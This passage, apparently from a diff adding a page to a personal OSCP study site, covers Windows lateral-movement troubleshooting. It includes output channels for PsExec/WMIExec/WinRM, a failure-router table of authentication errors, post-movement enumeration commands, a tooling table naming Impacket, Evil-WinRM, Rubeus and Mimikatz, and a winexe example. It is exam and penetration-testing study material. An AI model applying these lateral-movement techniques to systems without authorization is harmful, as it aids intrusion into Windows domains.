+./USER        -> tool-specific local-account selection
+</code></pre>
+<p>Common failure pattern:</p>
+<ol>
+<li>a local account authenticates over SMB;</li>
+<li>Windows issues a filtered remote token;</li>
+<li><code>ADMIN$</code>, SCM or WMI administrative operations fail.</li>
+</ol>
+<p>Do not “fix” this by changing <code>LocalAccountTokenFilterPolicy</code> during an attack workflow. Use a method already permitted by the target's configuration, the built-in Administrator where legitimately obtained and applicable, RDP if authorized, or another mapped identity.</p>
+<h2 id="10-output-channels-session-0-and-double-hop">10. Output channels, session 0 and double hop</h2>
+<p>Remote process creation, stdout retrieval and an interactive shell are separate states:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">AUTHENTICATED
+-> REMOTE OPERATION AUTHORIZED
+-> PROCESS/TASK/SERVICE CREATED
+-> COMMAND EFFECT OCCURRED
+-> OUTPUT RETURNED OR CALLBACK CONNECTED
+-> USABLE SESSION
+</code></pre>
+<ul>
+<li>PsExec returns named-pipe I/O through its service.</li>
+<li>WMIExec normally redirects output to an SMB share.</li>
+<li>SMBExec redirects command output while repeatedly creating services.</li>
+<li>ATExec writes output under <code>ADMIN$\Temp</code>.</li>
+<li>Native WMI/DCOM may return only a PID/return value; verify a harmless file or another bounded effect.</li>
+<li>WMI/DCOM/service processes commonly run in session 0, so a GUI is not visible to the logged-on user.</li>
+<li>WinRM creates a remote shell/runspace and returns structured or text output.</li>
+</ul>
+<p>A WinRM/PowerShell session on HOST_A may not possess delegable credentials for HOST_B. That “double hop” is a credential-context problem, not proof that HOST_B or the password is wrong. Prefer executing from the source that actually holds the credential/ticket rather than enabling broad delegation.</p>
+<h2 id="11-failure-router">11. Failure router</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Evidence</th><th>Layer</th><th>Next decision</th></tr></thead><tbody><tr><td>Timeout/refused</td><td>Route, firewall or listener</td><td>Verify from the actual source and account for RPC dynamic ports</td></tr><tr><td>SMB login succeeds; <code>ADMIN$</code> denied</td><td>Share/admin token/UAC</td><td>Distinguish share authentication from effective administrator context</td></tr><tr><td><code>(Pwn3d!)</code> but forced method fails</td><td>Method-specific SCM/WMI/task prerequisite</td><td>Test only that method's RPC/service right and side effects</td></tr><tr><td><code>STATUS_LOGON_FAILURE</code></td><td>Credential/domain/authentication</td><td>Correct local/domain context, artifact type and protocol</td></tr><tr><td><code>STATUS_ACCOUNT_RESTRICTION</code> or logon-type denial</td><td>Account policy/right</td><td>Check permitted logon type and deny overrides</td></tr><tr><td>RPC server unavailable</td><td>135/dynamic RPC/firewall/service</td><td>Validate endpoint mapper and negotiated port from source</td></tr><tr><td>WMI return value nonzero</td><td>Process creation request failed</td><td>Decode return value; command effect is unconfirmed</td></tr><tr><td>Process succeeds; output missing</td><td>Output channel, share or session-0 behavior</td><td>Use a bounded file/side-effect proof or compatible output option</td></tr><tr><td>WinRM listener responds; shell denied</td><td>Endpoint SDDL/group/logon/UAC policy</td><td>Validate endpoint authorization, not merely credentials</td></tr><tr><td>RDP NLA succeeds; logon denied</td><td>Remote-interactive right or deny policy</td><td>Verify Remote Desktop Users/Administrators and user-right assignment</td></tr><tr><td>RDP <code>/pth</code> denied</td><td>Restricted Admin disabled/unsupported or user not admin</td><td>Do not equate ordinary RDP authorization with Restricted Admin</td></tr><tr><td><code>KDC_ERR_S_PRINCIPAL_UNKNOWN</code></td><td>Hostname/SPN/realm</td><td>Use FQDN matching the ticket and correct realm</td></tr><tr><td><code>KRB_AP_ERR_MODIFIED</code></td><td>SPN account/key mismatch</td><td>Confirm SPN owner, target alias and ticket key</td></tr><tr><td>Clock-skew error</td><td>Time</td><td>Repair time before credential changes</td></tr><tr><td>Kerberos tool uses IP and falls back/fails</td><td>Name/SPN selection</td><td>Separate <code>TARGET_HOST</code> from <code>TARGET_IP</code></td></tr><tr><td>First hop works; second hop denied</td><td>Credential delegation/double hop</td><td>Move execution to credential-holding source or use an explicit ticket</td></tr></tbody></table>
+<h2 id="12-after-movement">12. After movement</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">hostname
+whoami /all
+ipconfig /all
+route print
+netstat -ano
+klist
+</code></pre>
+<p>Re-enumerate:</p>
+<ol>
+<li>local privilege and accessible credential sources;</li>
+<li>domain groups, ACLs, shares and host rights under the new identity;</li>
+<li>logged-on sessions and service accounts;</li>
+<li>interfaces, routes, DNS, listeners and internal reachability;</li>
+<li>the next evidence-backed host/identity transition.</li>
+</ol>
+<p>Do not overwrite the earlier state. Record the source host, credential form, authentication protocol, execution method, returned identity and side effects.</p>
+<h2 id="tooling-for-this-section">Tooling for this section</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Tool</th><th>Choose it for</th><th>Needs</th><th>Baseline</th><th>Decisive output</th><th>Failure cue</th></tr></thead><tbody><tr><td>Nmap/Test-NetConnection</td><td>Service reachability</td><td>Actual source route</td><td>Section 2</td><td>Reachable named service</td><td>Direct test bypasses/ignores the pivot</td></tr><tr><td>NetExec</td><td>Selected credential/admin-context validation</td><td>Supported protocol and credential</td><td>Section 3</td><td>Exact identity plus method-specific admin cue</td><td>Auth success without execution right</td></tr><tr><td>Impacket PsExec</td><td>Interactive SMB/SCM execution</td><td>Admin share + SCM</td><td>Section 4</td><td>Remote shell/verified identity</td><td>Share/service creation denied</td></tr><tr><td>Impacket SMBExec</td><td>Command shell without RemCom upload</td><td>SCM + output route</td><td>Section 4</td><td>Command output</td><td>Service/output share failure</td></tr><tr><td>Impacket ATExec</td><td>One-shot scheduled task</td><td>Task RPC + ADMIN$ output</td><td>Section 4</td><td>Retrieved command output</td><td>Task created but output unavailable</td></tr><tr><td>Impacket WMIExec</td><td>WMI process creation with password/hash/ticket</td><td>RPC/DCOM; SMB unless no-output</td><td>Section 5</td><td>Shell/output or verified effect</td><td>RPC works but share/output fails</td></tr><tr><td>Impacket DCOMExec</td><td>NTLM password/hash DCOM objects</td><td>RPC/DCOM and supported object</td><td>Section 5</td><td>Verified command effect</td><td>Kerberos deliberately unsupported</td></tr><tr><td>Evil-WinRM</td><td>Interactive WinRM/PSRP</td><td>Endpoint authorization</td><td>Section 6</td><td>Remote PowerShell prompt</td><td>Listener present but endpoint rejects</td></tr><tr><td>WinRS/PowerShell remoting</td><td>Built-in Windows management</td><td>WinRM and token/credential</td><td>Section 6</td><td>Remote hostname/identity</td><td>IP trust or double-hop issue</td></tr><tr><td>FreeRDP/MSTSC</td><td>GUI/remote-interactive session</td><td>RDP right/NLA; admin for Restricted Admin</td><td>Section 7</td><td>Usable desktop with verified identity</td><td>Auth accepted but logon type denied</td></tr><tr><td>Rubeus/Mimikatz/klist</td><td>Key/ticket context</td><td>Correct key/ticket/logon session</td><td>Section 8</td><td>Expected TGT/TGS client and service</td><td>Local token confused with network identity</td></tr></tbody></table>
+<p>Package names vary: current Kali-style Impacket commands commonly use the <code>impacket-</code> prefix, and FreeRDP 3 packages may expose <code>xfreerdp3</code> while older packages use <code>xfreerdp</code>. Inspect local <code>-h</code> output before use.</p>
+<h2 id="winexe--samba-side-service-execution-alternative">winexe — Samba-side service execution alternative</h2>
+<p>Use when the chosen account has working SMB authentication and effective remote service-control/administrative rights. This is a service-execution transport, not a credential bypass.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Prompts for the accepted identity's password
+winexe -U 'DOMAIN/USER' //TARGET 'cmd.exe /c whoami'
+</code></pre>
+<p>Read: verify the returned identity and destination. Access denied after a successful login points to authorization/UAC/service-control conditions; it does not justify guessing more passwords. Service creation and resulting artifacts require the same cleanup discipline as the other SMB execution methods. Prefer the existing supported Impacket/NetExec method when this legacy client is unavailable or incompatible.</p>
+<p>Sources: <a href="https://www.kali.org/tools/winexe/">upstream 1</a>.</p>
+<h2 id="sources">Sources</h2>
+<ul>
+<li>Supplied PEN-200, Chapter 24 pp786–804 for WMI/CIM, WinRS/WinRM, PsExec, PtH, Overpass-the-Hash, Pass-the-Ticket and DCOM.</li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge">OffSec OSCP+ Body of Knowledge</a></li>
+<li><a href="https://github.com/fortra/impacket/blob/master/examples/psexec.py">Impacket psexec</a>, <a href="https://github.com/fortra/impacket/blob/master/examples/smbexec.py">smbexec</a>, <a href="https://github.com/fortra/impacket/blob/master/examples/wmiexec.py">wmiexec</a>, <a href="https://github.com/fortra/impacket/blob/master/examples/atexec.py">atexec</a> and <a href="https://github.com/fortra/impacket/blob/master/examples/dcomexec.py">dcomexec</a></li>
+<li><a href="https://www.netexec.wiki/smb-protocol/command-execution/execute-remote-command">NetExec command execution</a> and <a href="https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-local">local authentication</a></li>
+<li><a href="https://learn.microsoft.com/windows-server/administration/windows-commands/winrs">Microsoft WinRS</a>, <a href="https://learn.microsoft.com/powershell/scripting/learn/remoting/running-remote-commands">PowerShell remoting</a>, <a href="https://learn.microsoft.com/powershell/module/cimcmdlets/new-cimsessionoption">CIM DCOM options</a></li>
+<li><a href="https://learn.microsoft.com/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction">Microsoft remote UAC behavior</a>, <a href="https://learn.microsoft.com/windows/security/application-security/application-control/administrator-protection/">Administrator Protection</a> and <a href="https://learn.microsoft.com/windows/security/identity-protection/remote-credential-guard">Remote Credential Guard/Restricted Admin</a></li>
+<li><a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a> and <a href="https://github.com/FreeRDP/FreeRDP/blob/master/client/common/cmdline.h">FreeRDP command-line source</a></li>
+<li><a href="https://lizajose.github.io/getSH/ad">getSH Active Directory route</a>, source snapshot <a href="https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98"><code>e1f62dd</code></a></li>
+<li><a href="https://github.com/LeonardoE95/OSCP/tree/main/modules/active-directory">Hexdump Active Directory module</a> and <a href="https://github.com/LeonardoE95/OSCP/blob/main/cheatsheet.org">consolidated cheatsheet</a>. The live AD module remains a TODO; only its concise RDP/SMB cues were used and independently checked.</li>
+</ul></article></div></main></div></div><footer class="site-footer" data-astro-cid-jo6i4kqk><div class="footer-inner" data-astro-cid-jo6i4kqk><nav class="footer-links" aria-label="Footer navigation" data-astro-cid-jo6i4kqk><a href="/" data-astro-cid-jo6i4kqk>Home</a><a href="/projects/" data-astro-cid-jo6i4kqk>Projects</a><a href="/tools/" aria-current="page" data-astro-cid-jo6i4kqk>Tools</a></nav><nav class="footer-tools" aria-label="Interactive tools" data-astro-cid-jo6i4kqk><span data-astro-cid-jo6i4kqk>Interactive tools</span><a href="/tools/oscp/" aria-current="page" data-astro-cid-jo6i4kqk>OSCP strategy workspace <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a><a href="/tools/attack-path/" data-astro-cid-jo6i4kqk>Attack-path visualizer <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a></nav><div class="footer-meta" data-astro-cid-jo6i4kqk><p data-astro-cid-jo6i4kqk>© 2026 Armaan. Built with curiosity.</p><div data-astro-cid-jo6i4kqk><a href="https://github.com/ArmaanLeg3nd" target="_blank" rel="noreferrer" data-astro-cid-jo6i4kqk>GitHub ↗</a><span data-astro-cid-jo6i4kqk>GMT+8</span></div></div></div></footer><script type="module" src="/_assets/MotionController.astro_astro_type_script_index_0_lang.BuT1diwy.js"></script></body></html><script type="module">function e(){document.querySelectorAll(`[data-reference-copy]`).forEach(e=>{e.dataset.ready||(e.dataset.ready=`true`,e.addEventListener(`click`,async()=>{let t=e.parentElement?.querySelector(`code`);if(t){try{await navigator.clipboard.writeText(t.textContent||``),e.textContent=`Copied`}catch{e.textContent=`Select and copy`}window.setTimeout(()=>e.textContent=`Copy`,1600)}}))})}e(),document.addEventListener(`astro:page-load`,e);</script>
